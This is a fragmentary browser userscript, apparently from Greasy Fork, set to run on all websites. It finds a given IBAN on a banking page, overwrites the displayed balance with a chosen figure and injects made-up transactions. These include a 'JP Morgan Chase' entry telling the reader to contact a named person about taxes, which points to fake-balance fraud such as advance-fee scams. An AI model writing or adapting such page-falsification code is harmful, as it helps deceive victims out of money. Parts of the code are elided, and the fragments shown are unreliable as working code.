...
// ==UserScript==
// @name         Ed Raif Combined Walter Knecht
...
// @match        *://*/*
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/482813/Ed%20Raif%20Combined%20Walter%20Knecht.user.js
// @updateURL https://update.greasyfork.org/scripts/482813/Ed%20Raif%20Combined%20Walter%20Knecht.meta.js
// ==/UserScript==
...
//------------MODIF BALANCE------------MODIF BALANCE------------MODIF BALANCE------------MODIF BALANCE------------MODIF BALANCE------------MODIF BALANCE-------------
    ...
    var modificationValue = 9800.00; // Change this value as needed

    // Specify the text to search for in the page
    var searchText = 'AT49 3743 8000 0008 0457';
...
//    var searchText = "AT09 3411 0000 0182 1701"; // Text to search for in the page
    ...
    var transactions = [
        {
            ...
            transactionAmount: "97.726,46 EUR",
            transactionOrder: 4 // Order in which this transaction should be inserted
        },
        {
        ...
        }, 
   {
            ...
            transactionDetails: "Kredit für 10%.",
            transactionAmount: "3.000.00 EUR",
            transactionOrder: 2 // Order in which this transaction should be inserted
        },
 {
            transactionName: "JP Morgan Chase",
            transactionDetails: "Geld für Steuern. An Andreas Graf wenden.",
            transactionAmount: "6.700.00 EUR",
